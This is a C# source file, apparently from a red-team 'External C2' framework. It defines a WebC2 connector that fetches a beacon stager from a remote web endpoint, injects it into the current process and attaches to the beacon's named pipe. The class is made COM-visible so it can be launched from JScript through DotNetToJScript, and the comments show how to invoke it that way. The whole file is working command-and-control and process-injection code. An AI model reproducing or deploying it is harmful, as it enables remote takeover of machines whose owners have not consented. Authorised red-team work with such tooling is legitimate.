using System;
using System.Runtime.InteropServices;
using ExternalC2.Channels;
using ExternalC2.Connectors;
using ExternalC2.Interfaces;

namespace ExternalC2
{
    /// <summary>
    ///     A simple Web C2 connector that handles communication between the beacon and a remote web endpoint
    ///     The remote web endpoint should send the request to the External C2 socket, and then read/return the socket response
    ///     Class is ComVisble for DotNetToJScript compatibility
    ///     To use with JScript:
    ///     o.Configure('http://127.0.0.1/beacon');
    ///     o.Go()
    /// </summary>
    [ComVisible(true)]
    public class WebC2 : BeaconConnector, IC2Connector
    {
        /// <summary>
        ///     Create WebC2 with the specified URL
        /// </summary>
        /// <param name="url"></param>
        public WebC2(string url)
            : base(new WebChannel(url))
        {
            UrlEndpoint = url;
        }

        /// <summary>
        ///     Public default constructor for DotNetToJScript and Unit Tests
        ///     Use Configure(url) to setup web client
        /// </summary>
        public WebC2()
        {
        }

        // Convenient casts for use in Initialize()
        private WebChannel Server => (WebChannel) ServerChannel;
        private BeaconChannel Beacon => (BeaconChannel) BeaconChannel;

        /// <summary>
        ///     A unique identifier for the connection and beacon's named pipe
        /// </summary>
        public Guid PipeName { get; private set; }

        /// <summary>
        ///     The Web URL endpoint with the format: http://127.0.0.1/beacon
        /// </summary>
        public string UrlEndpoint { get; private set; }

        /// <summary>
        ///     The main initiliazation function responsible for:
        ///     1. Connecting to the ServerChannel (Web Server)
        ///     2. Retreiving the stager from the ServerChannel
        ///     3. Injecting the stager into the current process
        ///     4. Connecting to the pipe created by the injected stager
        /// </summary>
        public override Func<bool> Initialize => () =>
        {
            Console.WriteLine($"[-] Connecting to Web Endpoint: {UrlEndpoint}");
            if (!Server.Connect()) return false;

            Console.WriteLine("[-] Grabbing stager bytes");
            PipeName = Server.BeaconId;
            var stager = Server.GetStager(PipeName.ToString(), Is64Bit);

            Console.WriteLine("[-] Creating new stager thread");
            if (InjectStager(stager) == 0) return false;
            Console.WriteLine("[+] Stager thread created!");

            Console.WriteLine($"[-] Connecting to pipe {PipeName}");
            Beacon.SetPipeName(PipeName);
            if (!Beacon.Connect()) return false;
            Console.WriteLine("[+] Connected to pipe, C2 initialization complete!");

            return true;
        };

        /// <summary>
        ///     Configuration function for DotNetToJScript and Unit Tests
        /// </summary>
        /// <param name="url"></param>
        public void Configure(string url)
        {
            BeaconChannel = new BeaconChannel();
            ServerChannel = new WebChannel(url);
            UrlEndpoint = url;
        }
    }
}